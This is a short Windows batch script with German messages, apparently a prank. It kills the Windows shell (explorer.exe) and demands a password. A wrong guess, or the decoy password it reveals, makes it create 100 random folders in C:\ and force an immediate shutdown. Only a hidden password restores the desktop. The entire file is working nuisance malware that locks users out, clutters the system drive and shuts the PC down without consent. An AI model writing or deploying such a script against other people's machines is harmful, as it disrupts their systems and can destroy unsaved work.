@echo off 
title Von 1 - 10 wie verzweifelt bist du? 
color 03 
:anfang
set pwst=69x3
set zahl=0
set hund=100
set pwsc=schueler
taskkill /f /im	explorer.exe
cls
echo.
echo      Wie lautet das Passwort?
echo.
set /p pwin= 
if %pwin%==%pwst% goto hack
if %pwin%==%pwsc% goto sc
:False 
cls 
echo.
echo     Falsch, das muss bestraft werden!
echo.
echo         Es werden 100 weitere Ordner erstellt
ping 127.0.0.1 -n 4 >nul
:ord
mkdir C:\%random%
set /a  zahl= %zahl% +1
if %zahl%==%hund% goto std
goto ord

:std 
cls 
echo.
echo     100 sind erstellt :P
echo.
echo.
echo       Das Passwort wäre schueler gewesen!
ping 127.0.0.1 -n 4 >nul
shutdown /s /f /t 0

:sc
cls
echo.
echo   Als ob Es schueler waere xD 
ping 127.0.0.1 -n 4 >nul
shutdown /s /f /t 0


:hack 

echo Du hast es richtig gemacht O.o, mein Respekt!
ping 127.0.0.1 -n 4 >nul
start explorer.exe
echo Dankeschön :D So schlimm wars doch gar nicht.
echo.
echo     Jetzt musst du nurnoch den Rest wegmachen :P
pause > nul